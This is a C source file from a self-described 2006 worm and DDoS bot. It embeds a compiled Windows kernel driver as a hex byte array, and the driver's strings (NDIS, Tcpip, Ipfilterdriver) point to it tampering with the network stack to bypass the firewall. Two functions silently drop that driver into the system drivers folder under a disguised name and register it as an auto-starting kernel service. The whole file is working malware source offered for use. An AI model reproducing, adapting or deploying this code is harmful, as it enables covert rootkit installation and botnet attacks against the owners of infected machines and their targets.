//-----------------------------------------------------------------
// this file is a part of: DKCS WORM.DDoS bot v 0.1
// c0d3d by: Dr.Pixel
// 2006 (C) DKCS Security Team
//
// contacts:	e-mail:	dkcs@void.ru
//				icq:	7600278
//				web:	http://dkcs.void.ru
//				forum:	http://dkcs.net.ru
//-----------------------------------------------------------------
static BYTE FirewallSex[] ={
0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0xFF,0xFF,0x00,
0x00,0xB8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0xD0,0x00,0x00,0x00,0x0E,0x1F,0xBA,0x0E,0x00,0xB4,0x09,0xCD,0x21,0xB8,0x01,
0x4C,0xCD,0x21,0x54,0x68,0x69,0x73,0x20,0x70,0x72,0x6F,0x67,0x72,0x61,0x6D,
0x20,0x63,0x61,0x6E,0x6E,0x6F,0x74,0x20,0x62,0x65,0x20,0x72,0x75,0x6E,0x20,
0x69,0x6E,0x20,0x44,0x4F,0x53,0x20,0x6D,0x6F,0x64,0x65,0x2E,0x0D,0x0D,0x0A,
0x24,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x99,0xD6,0xCE,0xDE,0xDD,0xB7,0xA0,
0x8D,0xDD,0xB7,0xA0,0x8D,0xDD,0xB7,0xA0,0x8D,0xDD,0xB7,0xA1,0x8D,0xD5,0xB7,
0xA0,0x8D,0x84,0x94,0xB3,0x8D,0xD8,0xB7,0xA0,0x8D,0xFA,0x71,0xDD,0x8D,0xDC,
0xB7,0xA0,0x8D,0xFA,0x71,0xD8,0x8D,0xDC,0xB7,0xA0,0x8D,0x52,0x69,0x63,0x68,
0xDD,0xB7,0xA0,0x8D,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x50,0x45,
0x00,0x00,0x4C,0x01,0x04,0x00,0xB2,0xC1,0xCC,0x44,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0xE0,0x00,0x02,0x01,0x0B,0x01,0x08,0x00,0x80,0x03,0x00,0x00,
0xE0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xCD,0x02,0x00,0x00,0x80,0x02,0x00,
0x00,0xC0,0x04,0x00,0x00,0x00,0x00,0x01,0x00,0x20,0x00,0x00,0x00,0x20,0x00,
0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0xE0,0x06,0x00,0x00,0x80,0x02,0x00,0x00,0xD9,0xF3,0x00,0x00,
0x01,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x10,
0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x05,0x00,0x00,0x3C,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xA0,0x06,0x00,0x00,0x24,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0xC0,0x04,0x00,0x00,0x28,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x2E,0x74,0x65,0x78,0x74,0x00,0x00,0x00,0x36,
0x02,0x00,0x00,0x80,0x02,0x00,0x00,0x40,0x02,0x00,0x00,0x80,0x02,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,
0x68,0x2E,0x72,0x64,0x61,0x74,0x61,0x00,0x00,0x84,0x00,0x00,0x00,0xC0,0x04,
0x00,0x00,0xA0,0x00,0x00,0x00,0xC0,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x48,0x49,0x4E,0x49,0x54,
0x00,0x00,0x00,0x00,0x40,0x01,0x00,0x00,0x60,0x05,0x00,0x00,0x40,0x01,0x00,
0x00,0x60,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x20,0x00,0x00,0xE2,0x2E,0x72,0x65,0x6C,0x6F,0x63,0x00,0x00,0x26,
0x00,0x00,0x00,0xA0,0x06,0x00,0x00,0x40,0x00,0x00,0x00,0xA0,0x06,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,
0x42,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x55,0x8B,0xEC,0xC9,0xC2,
0x14,0x00,0x55,0x8B,0xEC,0xC9,0xC2,0x0C,0x00,0x55,0x8B,0xEC,0x8B,0x4D,0x08,
0xE3,0x33,0x80,0x39,0xE8,0x75,0x2E,0x8B,0x51,0x01,0x8D,0x54,0x0A,0x05,0x81,
0x3A,0x58,0x83,0xC0,0x03,0x75,0x05,0x8B,0x51,0x08,0xEB,0x0F,0x81,0x3A,0x58,
0xFF,0x30,0x60,0x75,0x05,0x8B,0x51,0x05,0xEB,0x02,0xEB,0x0B,0xC6,0x01,0xE9,
0x2B,0xD1,0x83,0xEA,0x05,0x89,0x51,0x01,0xC9,0xC2,0x04,0x00,0x55,0x8B,0xEC,
0x83,0xC4,0x9C,0x56,0x57,0x53,0x8D,0x45,0xA8,0x50,0x6A,0x00,0x6A,0x00,0x68,
0xD0,0x04,0x01,0x00,0x6A,0x00,0x6A,0x00,0x6A,0x40,0x68,0x04,0x05,0x01,0x00,
0xE8,0xB1,0x01,0x00,0x00,0x85,0xC0,0x0F,0x85,0x57,0x01,0x00,0x00,0x8B,0x45,
0xA8,0x8B,0x58,0x04,0x83,0x63,0x10,0x00,0x8B,0x5B,0x0C,0x85,0xDB,0x75,0xF5,
0xFF,0x75,0xA8,0xE8,0x8A,0x01,0x00,0x00,0x8D,0x7D,0xB4,0xB9,0x4C,0x00,0x00,
0x00,0x33,0xC0,0xF3,0xAA,0xC6,0x45,0xB4,0x04,0xC7,0x45,0xF0,0x80,0x02,0x01,
0x00,0xC7,0x45,0xF4,0x87,0x02,0x01,0x00,0x6A,0x4C,0x8D,0x45,0xB4,0x50,0x8D,
0x45,0xAC,0x50,0x8D,0x45,0xB0,0x50,0xE8,0x65,0x01,0x00,0x00,0x83,0x7D,0xB0,
0x00,0x0F,0x85,0x03,0x01,0x00,0x00,0x8B,0x5D,0xAC,0x8B,0x5B,0x10,0xFF,0x75,
0xAC,0x8D,0x45,0xB0,0x50,0xE8,0x4F,0x01,0x00,0x00,0xFF,0x73,0x1C,0xE8,0x25,
0xFF,0xFF,0xFF,0xFF,0x73,0x24,0xE8,0x1D,0xFF,0xFF,0xFF,0xFF,0x73,0x28,0xE8,
0x15,0xFF,0xFF,0xFF,0xFF,0x73,0x30,0xE8,0x0D,0xFF,0xFF,0xFF,0xFF,0x73,0x34,
0xE8,0x05,0xFF,0xFF,0xFF,0xFF,0x73,0x3C,0xE8,0xFD,0xFE,0xFF,0xFF,0xFF,0x73,
0x4C,0xE8,0xF5,0xFE,0xFF,0xFF,0xFF,0x73,0x50,0xE8,0xED,0xFE,0xFF,0xFF,0xFF,
0x73,0x54,0xE8,0xE5,0xFE,0xFF,0xFF,0x8B,0x33,0x85,0xF6,0x74,0x4F,0xFF,0x76,
0x30,0xE8,0xD7,0xFE,0xFF,0xFF,0xFF,0x76,0x34,0xE8,0xCF,0xFE,0xFF,0xFF,0xFF,
0x76,0x38,0xE8,0xC7,0xFE,0xFF,0xFF,0xFF,0x76,0x3C,0xE8,0xBF,0xFE,0xFF,0xFF,
0xFF,0x76,0x40,0xE8,0xB7,0xFE,0xFF,0xFF,0xFF,0x76,0x4C,0xE8,0xAF,0xFE,0xFF,
0xFF,0xFF,0x76,0x50,0xE8,0xA7,0xFE,0xFF,0xFF,0xFF,0x76,0x54,0xE8,0x9F,0xFE,
0xFF,0xFF,0xFF,0x76,0x64,0xE8,0x97,0xFE,0xFF,0xFF,0x8B,0x76,0x18,0x85,0xF6,
0x75,0xB1,0x8B,0x5B,0x10,0x85,0xDB,0x0F,0x85,0x58,0xFF,0xFF,0xFF,0x8D,0x45,
0xA0,0x50,0x8D,0x45,0xA4,0x50,0x68,0x00,0x00,0x10,0xC0,0x68,0x3C,0x05,0x01,
0x00,0xE8,0x78,0x00,0x00,0x00,0x85,0xC0,0x75,0x2E,0x83,0x65,0x9C,0x00,0x6A,
0x00,0x6A,0x00,0x6A,0x00,0x6A,0x00,0x6A,0x00,0x6A,0x04,0x8D,0x45,0x9C,0x50,
0xFF,0x75,0xA0,0x68,0x30,0x80,0x12,0x00,0xE8,0x47,0x00,0x00,0x00,0x85,0xC0,
0x74,0x09,0x50,0xFF,0x75,0xA0,0xE8,0x40,0x00,0x00,0x00,0xB8,0x82,0x01,0x00,
0xC0,0x5B,0x5F,0x5E,0xC9,0xC2,0x08,0x00,0x00,0x00,0x61,0x75,0x74,0x68,0x6F,
0x72,0x3A,0x20,0x4D,0x61,0x44,0x20,0x6D,0x61,0x64,0x2D,0x66,0x61,0x63,0x74,
0x6F,0x72,0x40,0x6D,0x61,0x69,0x6C,0x2E,0x72,0x75,0x20,0x33,0x30,0x2F,0x30,
0x37,0x2F,0x32,0x30,0x30,0x36,0x00,0x00,0xCC,0xFF,0x25,0xE0,0x04,0x01,0x00,
0xFF,0x25,0xD4,0x04,0x01,0x00,0xFF,0x25,0xCC,0x04,0x01,0x00,0xFF,0x25,0xDC,
0x04,0x01,0x00,0xFF,0x25,0xD8,0x04,0x01,0x00,0xFF,0x25,0xC0,0x04,0x01,0x00,
0xFF,0x25,0xC4,0x04,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x64,0x06,0x00,0x00,0x7C,0x06,0x00,0x00,0x00,0x00,0x00,0x00,0xF4,0x05,
0x00,0x00,0x40,0x06,0x00,0x00,0xE4,0x05,0x00,0x00,0x26,0x06,0x00,0x00,0x10,
0x06,0x00,0x00,0xC4,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x5C,0x00,0x44,0x00,
0x72,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x72,0x00,0x5C,0x00,0x54,0x00,0x63,
0x00,0x70,0x00,0x69,0x00,0x70,0x00,0x00,0x00,0x1A,0x00,0x1C,0x00,0xE8,0x04,
0x01,0x00,0x5C,0x00,0x44,0x00,0x65,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,
0x00,0x5C,0x00,0x49,0x00,0x70,0x00,0x66,0x00,0x69,0x00,0x6C,0x00,0x74,0x00,
0x65,0x00,0x72,0x00,0x64,0x00,0x72,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x72,
0x00,0x00,0x00,0x00,0x00,0x2C,0x00,0x2E,0x00,0x0C,0x05,0x01,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xA8,0x05,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x56,0x06,0x00,0x00,0xCC,0x04,0x00,
0x00,0x9C,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x96,0x06,
0x00,0x00,0xC0,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x64,0x06,0x00,0x00,
0x7C,0x06,0x00,0x00,0x00,0x00,0x00,0x00,0xF4,0x05,0x00,0x00,0x40,0x06,0x00,
0x00,0xE4,0x05,0x00,0x00,0x26,0x06,0x00,0x00,0x10,0x06,0x00,0x00,0xC4,0x05,
0x00,0x00,0x00,0x00,0x00,0x00,0x0B,0x01,0x49,0x6F,0x42,0x75,0x69,0x6C,0x64,
0x44,0x65,0x76,0x69,0x63,0x65,0x49,0x6F,0x43,0x6F,0x6E,0x74,0x72,0x6F,0x6C,
0x52,0x65,0x71,0x75,0x65,0x73,0x74,0x00,0x0E,0x01,0x49,0x6F,0x43,0x61,0x6C,
0x6C,0x44,0x72,0x69,0x76,0x65,0x72,0x00,0x00,0x3D,0x01,0x49,0x6F,0x47,0x65,
0x74,0x44,0x65,0x76,0x69,0x63,0x65,0x4F,0x62,0x6A,0x65,0x63,0x74,0x50,0x6F,
0x69,0x6E,0x74,0x65,0x72,0x00,0x00,0xAB,0x02,0x4F,0x62,0x44,0x65,0x72,0x65,
0x66,0x65,0x72,0x65,0x6E,0x63,0x65,0x4F,0x62,0x6A,0x65,0x63,0x74,0x00,0xB6,
0x02,0x4F,0x62,0x52,0x65,0x66,0x65,0x72,0x65,0x6E,0x63,0x65,0x4F,0x62,0x6A,
0x65,0x63,0x74,0x42,0x79,0x4E,0x61,0x6D,0x65,0x00,0x2D,0x01,0x49,0x6F,0x44,
0x72,0x69,0x76,0x65,0x72,0x4F,0x62,0x6A,0x65,0x63,0x74,0x54,0x79,0x70,0x65,
0x00,0x00,0x6E,0x74,0x6F,0x73,0x6B,0x72,0x6E,0x6C,0x2E,0x65,0x78,0x65,0x00,
0x00,0x09,0x01,0x4E,0x64,0x69,0x73,0x52,0x65,0x67,0x69,0x73,0x74,0x65,0x72,
0x50,0x72,0x6F,0x74,0x6F,0x63,0x6F,0x6C,0x00,0x00,0x69,0x00,0x4E,0x64,0x69,
0x73,0x44,0x65,0x72,0x65,0x67,0x69,0x73,0x74,0x65,0x72,0x50,0x72,0x6F,0x74,
0x6F,0x63,0x6F,0x6C,0x00,0x00,0x4E,0x44,0x49,0x53,0x2E,0x53,0x59,0x53,0x00,
0x00,0x00,0x00,0x00,0x00,0x24,0x00,0x00,0x00,0xDF,0x32,0xEA,0x32,0x27,0x33,
0x2E,0x33,0x17,0x34,0x8E,0x34,0x94,0x34,0x9A,0x34,0xA0,0x34,0xA6,0x34,0xAC,
0x34,0xB2,0x34,0x08,0x35,0x40,0x35,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00};
//-----------------------------------------------------------------
void CreateFrwDriver(void){

	char	buf[256];
	HANDLE	drv_file;

	GetSystemDirectory(buf, 256);
	strcat(buf, "\\drivers\\flo_drv1.sys");
	drv_file = CreateFile(buf, GENERIC_WRITE, 0, 0, CREATE_NEW, FILE_ATTRIBUTE_SYSTEM, 0);
	WriteFile(drv_file, FirewallSex, sizeof(FirewallSex), NULL, NULL);
}
//-----------------------------------------------------------------
void RegisterFrwBypassingDriver(void){
    
	char	buf[256];

	GetSystemDirectory(buf, 256);
	strcat(buf, "\\drivers\\flo_drv1.sys");
	if(!FileExist(buf)){
        CreateFrwDriver();
        SC_HANDLE hSCHandle = OpenSCManager(0,0,SC_MANAGER_ALL_ACCESS);
		if(hSCHandle){
			SC_HANDLE hServiceHandle;
			BOOL bReturn = TRUE;
			hServiceHandle = CreateService(hSCHandle, "flo_drv1", "flo_drv1", SERVICE_START | SERVICE_STOP, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, buf, NULL, NULL, NULL, NULL, NULL);
			if(hServiceHandle){
				StartService(hServiceHandle, 0, NULL);
			}
			CloseServiceHandle(hSCHandle);
		}
	}
}
//-----------------------------------------------------------------